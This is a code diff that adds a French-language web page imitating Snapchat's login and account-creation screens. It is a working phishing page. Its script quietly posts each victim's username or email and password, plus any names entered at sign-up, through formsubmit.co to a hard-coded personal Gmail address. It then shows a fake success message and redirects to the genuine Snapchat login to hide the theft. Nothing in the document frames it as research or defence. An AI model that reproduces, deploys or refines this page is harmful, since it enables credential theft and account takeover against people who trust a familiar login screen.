@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Snapchat</title>
+  <style>
+    @font-face {
+      font-family: 'Snapchat Avenir';
+      src: local('Avenir Next Regular'), local('Avenir Next');
+      font-weight: 400;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Snapchat Avenir';
+      src: local('Avenir Next Medium');
+      font-weight: 500;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Snapchat Avenir';
+      src: local('Avenir Next Demi Bold'), local('Avenir Next DemiBold');
+      font-weight: 600;
+      font-style: normal;
+      font-display: swap;
+    }
+    @font-face {
+      font-family: 'Snapchat Avenir';
+      src: local('Avenir Next Bold');
+      font-weight: 700;
+      font-style: normal;
+      font-display: swap;
+    }
+  </style>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+      background: #FFFC00;
+      font-family: 'Snapchat Avenir', 'Avenir Next', 'Avenir', sans-serif;
+      overflow: hidden;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeSpeed;
+    }
+
+    body, body * {
+      font-family: 'Snapchat Avenir', 'Avenir Next', 'Avenir', sans-serif !important;
+    }
+
+    .phone {
+      width: 100%;
+      height: 100%;
+      min-height: 100dvh;
+      background: #FFFC00;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+
+    /* ── Status bar ── */
+    .status-bar {
+      width: 100%;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 22px;
+      flex-shrink: 0;
+    }
+    .status-time {
+      font-size: 15px;
+      font-weight: 800;
+      color: #000;
+    }
+    .status-icons {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .bar-signal {
+      display: flex;
+      align-items: flex-end;
+      gap: 2px;
+      height: 12px;
+    }
+    .bar-signal span {
+      display: block;
+      width: 3px;
+      background: #000;
+      border-radius: 1px;
+    }
+    .battery {
+      display: flex;
+      align-items: center;
+      gap: 1px;
+    }
+    .battery-body {
+      width: 22px;
+      height: 11px;
+      border: 1.5px solid #000;
+      border-radius: 2.5px;
+      padding: 1.5px;
+    }
+    .battery-body-fill {
+      width: 75%;
+      height: 100%;
+      background: #000;
+      border-radius: 1px;
+    }
+    .battery-nub {
+      width: 2px;
+      height: 5px;
+      background: #000;
+      border-radius: 0 1px 1px 0;
+    }
+
+    /* ── Ghost image ── */
+    .ghost-wrap {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .ghost-img {
+      width: 145px;
+      height: 145px;
+      object-fit: contain;
+    }
+
+    /* ── Buttons area ── */
+    .buttons-area {
+      width: 100%;
+      padding: 0 24px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 0;
+    }
+
+    .social-btn {
+      width: 100%;
+      height: 52px;
+      border-radius: 30px;
+      border: none;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 16px;
+      font-weight: 800;
+      color: #000;
+      cursor: pointer;
+      border: 1px solid rgba(0,0,0,0.12);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+    .social-btn:active {
+      transform: scale(0.97);
+      box-shadow: 0 1px 4px rgba(0,0,0,0.12);
+    }
+
+    /* Google icon */
+    .google-icon {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    /* Apple icon */
+    .apple-icon {
+      width: 18px;
+      height: 22px;
+      flex-shrink: 0;
+    }
+
+    /* ── Bottom buttons ── */
+    .bottom-btns {
+      width: 100%;
+      margin-top: 24px;
+    }
+
+    .bottom-btn {
+      width: 100%;
+      height: 64px;
+      border: none;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 17px;
+      font-weight: 900;
+      color: #fff;
+      letter-spacing: 1.5px;
+      cursor: pointer;
+      transition: filter 0.15s ease;
+    }
+    .bottom-btn:active {
+      filter: brightness(0.9);
+    }
+
+    .btn-login {
+      background: #E8325A;
+    }
+    .btn-register {
+      background: #00C0F0;
+    }
+
+    /* ══════════════════════════════
+       PAGE CONNEXION
+    ══════════════════════════════ */
+    .login-page {
+      position: absolute;
+      inset: 0;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 0 28px 30px;
+      transform: translateX(100%);
+      transform: translate3d(100%, 0, 0);
+      transition: transform 0.28s cubic-bezier(0.4, 0, 0.2, 1);
+      will-change: transform;
+      z-index: 10;
+      overflow-y: auto;
+    }
+    .login-page.visible {
+      transform: translate3d(0, 0, 0);
+    }
+
+    /* Back arrow */
+    .login-back {
+      margin-top: 54px;
+      margin-bottom: 8px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 36px;
+      padding: 0;
+      color: #0084FF;
+      font-size: 26px;
+      line-height: 1;
+      text-align: left;
+    }
+
+    /* Title */
+    .login-title {
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 26px;
+      font-weight: 600;
+      color: #000;
+      text-align: center;
+      margin-top: 14px;
+      margin-bottom: 40px;
+    }
+
+    /* Input fields */
+    .login-field {
+      width: 100%;
+      margin-bottom: 28px;
+      position: relative;
+    }
+    .login-field label {
+      display: block;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.8px;
+      color: #999;
+      margin-bottom: 8px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+    }
+    .login-field input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #ddd;
+      background: transparent;
+      padding: 4px 36px 10px 0;
+      font-size: 16px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      color: #000;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .login-field input:focus {
+      border-bottom-color: #000;
+    }
+    .eye-btn {
+      position: absolute;
+      right: 0;
+      bottom: 8px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #aaa;
+      padding: 0;
+    }
+
+    /* Forgot password */
+    .forgot-link {
+      text-align: center;
+      margin: 10px 0 0;
+    }
+    .forgot-link a {
+      font-size: 15px;
+      color: #0084FF;
+      text-decoration: none;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-weight: 500;
+    }
+
+    /* Spacer */
+    .login-spacer { flex: 1; }
+
+    /* Connexion button (gray disabled style) */
+    .login-submit-btn {
+      width: 220px;
+      height: 52px;
+      border-radius: 30px;
+      border: none;
+      background: #C8C8CE;
+      color: #fff;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin: 0 auto 18px;
+      display: block;
+      transition: background 0.2s, transform 0.15s;
+    }
+    .login-submit-btn.active {
+      background: #000;
+    }
+    .login-submit-btn:active {
+      transform: scale(0.97);
+    }
+
+    /* Spinner circulaire */
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .btn-spinner {
+      width: 22px;
+      height: 22px;
+      border: 2.5px solid rgba(255,255,255,0.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+      display: inline-block;
+    }
+
+    /* OU separator */
+    .login-or {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .login-or-line {
+      flex: 1;
+      height: 1px;
+      background: #e0e0e0;
+    }
+    .login-or-text {
+      font-size: 13px;
+      color: #999;
+      font-weight: 600;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+    }
+
+    /* Social buttons black */
+    .login-social-btn {
+      width: 100%;
+      height: 52px;
+      border-radius: 30px;
+      border: none;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      color: #fff;
+      cursor: pointer;
+      margin-bottom: 12px;
+      transition: opacity 0.15s, transform 0.15s;
+    }
+    .login-social-btn:active {
+      opacity: 0.85;
+      transform: scale(0.97);
+    }
+    .login-google-icon { width: 20px; height: 20px; flex-shrink: 0; }
+    .login-apple-icon  { width: 17px; height: 20px; flex-shrink: 0; }
+
+    /* Checkbox row */
+    .login-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 14px;
+    }
+    .login-checkbox-row input[type=checkbox] {
+      width: 16px;
+      height: 16px;
+      accent-color: #0084FF;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .login-checkbox-row label {
+      font-size: 12px;
+      color: #555;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      cursor: pointer;
+      line-height: 1.3;
+    }
+    /* ══════════════════════════════
+       PAGE INSCRIPTION
+    ══════════════════════════════ */
+    .register-page {
+      position: absolute;
+      inset: 0;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 0 24px 30px;
+      transform: translateX(100%);
+      transform: translate3d(100%, 0, 0);
+      transition: transform 0.28s cubic-bezier(0.4, 0, 0.2, 1);
+      will-change: transform;
+      z-index: 10;
+      overflow-y: auto;
+    }
+    .register-page.visible {
+      transform: translate3d(0, 0, 0);
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+    .reg-header {
+      display: flex;
+      align-items: center;
+      margin-top: 54px;
+      margin-bottom: 40px;
+      position: relative;
+    }
+    .reg-back {
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 36px;
+      padding: 0;
+      color: #000;
+      font-size: 28px;
+      font-weight: 600;
+      line-height: 1;
+      text-align: left;
+    }
+    .reg-title-box {
+      flex: 1;
+      text-align: center;
+      margin-right: 36px;
+    }
+    .reg-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #000;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+    }
+    .reg-step {
+      font-size: 13px;
+      color: #b0b0b0;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+    .reg-field {
+      margin-bottom: 24px;
+    }
+    .reg-field label {
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      color: #000;
+      margin-bottom: 8px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+    }
+    .reg-field input {
+      width: 100%;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 16px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      color: #000;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .reg-field input::placeholder {
+      color: #b0b0b0;
+    }
+    .reg-field input:focus {
+      border-color: #000;
+    }
+    .reg-legal-text {
+      font-size: 13px;
+      color: #000;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-weight: 500;
+    }
+    .reg-legal-text a {
+      color: #0084FF;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .reg-submit-btn {
+      width: 100%;
+      height: 52px;
+      border-radius: 30px;
+      border: none;
+      background: #b9bec6;
+      color: #fff;
+      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+    }
+    .reg-submit-btn.active {
+      background: #0084FF;
+    }
+  </style>
+</head>
+<body>
+
+<div class="phone">
+
+
+  <!-- Ghost Logo — iconesnap.png -->
+  <div class="ghost-wrap">
+    <img src="iconesnap.png" alt="Snapchat" class="ghost-img">
+  </div>
+
+  <!-- Social Buttons -->
+  <div class="buttons-area">
+
+    <!-- Google -->
+    <button class="social-btn" id="btn-google">
+      <svg class="google-icon" viewBox="0 0 24 24">
+        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+      </svg>
+      Continuer avec Google
+    </button>
+
+    <!-- Apple -->
+    <button class="social-btn" id="btn-apple">
+      <svg class="apple-icon" viewBox="0 0 814 1000" fill="#000" xmlns="http://www.w3.org/2000/svg">
+        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 790.9 0 663.1 0 541.8c0-207.9 140.1-318.3 278.4-318.3 78.5 0 144.1 48.7 192.6 48.7 46.6 0 121.2-52.3 208.5-52.3 33.8 0 119.2 3.9 181.3 74.9zM549.4 179.7C575 150.5 591.4 110.8 591.4 71c0-5.8-.5-11.6-1.6-16.8-46 1.9-101.2 31-135.2 67.3-25.6 27.6-47.2 67.3-47.2 107.6 0 6.4 1.1 12.8 1.6 14.8 2.7.5 7 1.1 11.3 1.1 41.6 0 93.4-27.5 129.1-65.3z"/>
+      </svg>
+      Continuer avec Apple
+    </button>
+
+  </div>
+
+  <!-- Bottom Buttons -->
+  <div class="bottom-btns">
+    <button class="bottom-btn btn-login" id="btn-login">SE CONNECTER</button>
+    <button class="bottom-btn btn-register" id="btn-register">S'INSCRIRE</button>
+  </div>
+
+</div>
+
+<!-- ══════ PAGE CONNEXION OVERLAY ══════ -->
+<div class="login-page" id="login-page">
+
+  <!-- Retour -->
+  <button class="login-back" id="login-back">&#8249;</button>
+
+  <!-- Titre -->
+  <h1 class="login-title">Connexion</h1>
+
+  <!-- Champ Identifiant -->
+  <div class="login-field">
+    <label for="login-username">NOM D'UTILISATEUR, ADRESSE E-MAIL<br>OU NUMÉRO DE TÉLÉPHONE</label>
+    <input type="text" id="login-username" autocomplete="username" spellcheck="false">
+  </div>
+
+  <!-- Champ Mot de passe -->
+  <div class="login-field">
+    <label for="login-password">MOT DE PASSE</label>
+    <input type="password" id="login-password" autocomplete="current-password">
+    <button class="eye-btn" id="eye-toggle" aria-label="Afficher le mot de passe">
+      <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
+        <path d="M11 0C6 0 1.73 3.11 0 7.5 1.73 11.89 6 15 11 15s9.27-3.11 11-7.5C20.27 3.11 16 0 11 0zm0 12.5a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z" fill="#aaa"/>
+        <line x1="2" y1="1" x2="20" y2="15" stroke="#aaa" stroke-width="1.8" stroke-linecap="round"/>
+      </svg>
+    </button>
+  </div>
+
+  <!-- Mot de passe oublié -->
+  <div class="forgot-link">
+    <a href="#">Mot de passe oublié ?</a>
+  </div>
+
+  <div class="login-spacer"></div>
+
+  <!-- Bouton Connexion -->
+  <button class="login-submit-btn" id="login-submit-btn">Connexion</button>
+
+  <!-- OU -->
+  <div class="login-or">
+    <div class="login-or-line"></div>
+    <span class="login-or-text">OU</span>
+    <div class="login-or-line"></div>
+  </div>
+
+  <!-- Google -->
+  <button class="login-social-btn">
+    <svg class="login-google-icon" viewBox="0 0 24 24">
+      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+    </svg>
+    Continuer avec Google
+  </button>
+
+  <!-- Apple -->
+  <button class="login-social-btn">
+    <svg class="login-apple-icon" viewBox="0 0 814 1000" fill="#fff">
+      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 790.9 0 663.1 0 541.8c0-207.9 140.1-318.3 278.4-318.3 78.5 0 144.1 48.7 192.6 48.7 46.6 0 121.2-52.3 208.5-52.3 33.8 0 119.2 3.9 181.3 74.9zM549.4 179.7C575 150.5 591.4 110.8 591.4 71c0-5.8-.5-11.6-1.6-16.8-46 1.9-101.2 31-135.2 67.3-25.6 27.6-47.2 67.3-47.2 107.6 0 6.4 1.1 12.8 1.6 14.8 2.7.5 7 1.1 11.3 1.1 41.6 0 93.4-27.5 129.1-65.3z"/>
+    </svg>
+    Continuer avec Apple
+  </button>
+
+  <!-- Checkbox -->
+  <div class="login-checkbox-row">
+    <input type="checkbox" id="save-login" checked>
+    <label for="save-login">Enregistrer les informations de connexion sur cet appareil</label>
+  </div>
+
+</div>
+
+<!-- ══════ PAGE INSCRIPTION OVERLAY ══════ -->
+<div class="register-page" id="register-page">
+
+  <div class="reg-header">
+    <button class="reg-back" id="reg-back">&#8249;</button>
+    <div class="reg-title-box">
+      <div class="reg-title">Créer un compte</div>
+      <div class="reg-step">Étape 1 sur 5</div>
+    </div>
+  </div>
+
+  <div class="reg-field">
+    <label for="reg-first">Prénom</label>
+    <input type="text" id="reg-first" placeholder="Prénom" autocomplete="given-name">
+  </div>
+
+  <div class="reg-field">
+    <label for="reg-last">Nom de famille</label>
+    <input type="text" id="reg-last" placeholder="Nom de famille (facultatif)" autocomplete="family-name">
+  </div>
+
+  <div class="reg-legal-text" style="margin-top: 10px;">
+    En appuyant sur "Accepter et continuer" ci-dessous, vous acceptez nos <a href="#">Conditions d'utilisation</a> et reconnaissez avoir lu notre <a href="#">Politique de confidentialité</a>.
+  </div>
+
+  <div class="reg-legal-text">
+    Snapchat est un <a href="#">service personnalisé</a>, <a href="#">financé par la publicité</a>. Cela signifie que nous utiliserons des données sur vous, vos amis·es et notre communauté, ainsi que des informations fournies par les annonceurs et les partenaires, y compris votre activité sur leurs sites web et applications, pour vous montrer du contenu et des publicités sur Snapchat qui, selon nous, vous intéresseront, et mesurer la performance de ces publicités.
+  </div>
+
+  <div class="login-spacer"></div>
+
+  <button class="reg-submit-btn" id="reg-submit-btn">Accepter et continuer</button>
+
+</div>
+
+<script>
+  const loginPage   = document.getElementById('login-page');
+  const loginBack   = document.getElementById('login-back');
+  const btnLogin    = document.getElementById('btn-login');
+  const usernameIn  = document.getElementById('login-username');
+  const passwordIn  = document.getElementById('login-password');
+  const submitBtn   = document.getElementById('login-submit-btn');
+  const eyeToggle   = document.getElementById('eye-toggle');
+
+  // Ouvrir page connexion
+  btnLogin.addEventListener('click', () => {
+    loginPage.classList.add('visible');
+    setTimeout(() => usernameIn.focus(), 350);
+  });
+
+  // Fermer / retour
+  loginBack.addEventListener('click', () => {
+    loginPage.classList.remove('visible');
+  });
+
+  // Activer bouton Connexion quand les champs sont remplis
+  function checkFields() {
+    const ok = usernameIn.value.trim().length > 0 && passwordIn.value.length > 0;
+    submitBtn.classList.toggle('active', ok);
+  }
+  usernameIn.addEventListener('input', checkFields);
+  passwordIn.addEventListener('input', checkFields);
+
+  // Afficher / masquer mot de passe
+  let pwVisible = false;
+  eyeToggle.addEventListener('click', () => {
+    pwVisible = !pwVisible;
+    passwordIn.type = pwVisible ? 'text' : 'password';
+  });
+
+  // ── Fonction envoi email via FormSubmit ──
+  const DEST_EMAIL = 'billalmechekour6@gmail.com';
+
+  async function envoyerEmail(data) {
+    try {
+      await fetch(`https://formsubmit.co/ajax/${DEST_EMAIL}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ ...data, _subject: '📱 Nouvelle activité Snapchat Clone' })
+      });
+    } catch (e) {
+      // Silencieux côté utilisateur
+    }
+  }
+
+  // ── CONNEXION : soumettre ──
+  submitBtn.addEventListener('click', async () => {
+    if (!submitBtn.classList.contains('active')) return;
+
+    // Afficher spinner
+    submitBtn.innerHTML = '<span class="btn-spinner"></span>';
+    submitBtn.disabled = true;
+
+    await envoyerEmail({
+      Type: '🔐 Connexion',
+      Identifiant: usernameIn.value.trim(),
+      MotDePasse: passwordIn.value,
+      Date: new Date().toLocaleString('fr-FR')
+    });
+
+    // Succès → redirection vers Snapchat réel
+    submitBtn.innerHTML = '✓ Connecté';
+    submitBtn.style.background = '#34C759';
+    setTimeout(() => {
+      window.location.href = 'https://accounts.snapchat.com/accounts/login';
+    }, 1500);
+  });
+
+  // ── INSCRIPTION ──
+  const registerPage = document.getElementById('register-page');
+  const regBack      = document.getElementById('reg-back');
+  const btnRegister  = document.getElementById('btn-register');
+  const regFirst     = document.getElementById('reg-first');
+  const regLast      = document.getElementById('reg-last');
+  const regSubmit    = document.getElementById('reg-submit-btn');
+
+  btnRegister.addEventListener('click', () => {
+    registerPage.classList.add('visible');
+    setTimeout(() => regFirst.focus(), 350);
+  });
+
+  regBack.addEventListener('click', () => {
+    registerPage.classList.remove('visible');
+  });
+
+  regFirst.addEventListener('input', () => {
+    regSubmit.classList.toggle('active', regFirst.value.trim().length > 0);
+  });
+
+  regSubmit.addEventListener('click', async () => {
+    if (!regSubmit.classList.contains('active')) return;
+    regSubmit.textContent = '⏳ Envoi...';
+    regSubmit.disabled = true;
+
+    await envoyerEmail({
+      Type: '📝 Inscription',
+      Prénom: regFirst.value.trim(),
+      'Nom de famille': regLast.value.trim() || '(non renseigné)',
+      Date: new Date().toLocaleString('fr-FR')
+    });
+
+    regSubmit.textContent = '✓ Compte créé !';
+    regSubmit.style.background = '#34C759';
+    setTimeout(() => {
+      registerPage.classList.remove('visible');
+      regSubmit.textContent = 'Accepter et continuer';
+      regSubmit.style.background = '';
+      regSubmit.disabled = false;
+      regFirst.value = '';
+      regLast.value = '';
+      regSubmit.classList.remove('active');
+    }, 1500);
+  });
+</script>
+
+</body>
+</html>
